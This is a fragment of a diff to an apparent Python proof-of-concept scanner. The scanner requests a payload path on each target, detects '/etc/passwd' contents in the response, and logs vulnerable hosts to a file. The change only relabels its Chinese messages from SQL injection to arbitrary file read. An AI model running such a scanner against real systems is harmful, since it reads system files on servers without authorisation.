@@ -17,11 +17,11 @@ def poc(target):
         if res1.status_code == 200:
             res2=requests.get(url=target+payload,headers=headres,verify=False)
             if 'root:x:0:0:root:/root:/sbin/nologin' in res2.text:
-                print(f"[+]{target}存在sql注入漏洞")
+                print(f"[+]{target}存在任意文件读取漏洞")
                 with open('result1.txt','a',encoding='utf-8') as fp:
                     fp.write(target+'\n')
             else:
-                print(f"[-]该{target}不存在sql注入漏洞")
+                print(f"[-]该{target}不存在任意文件读取漏洞")
         else:
             print(f"[*]该{target}存在问题,请手工测试")        
     except:
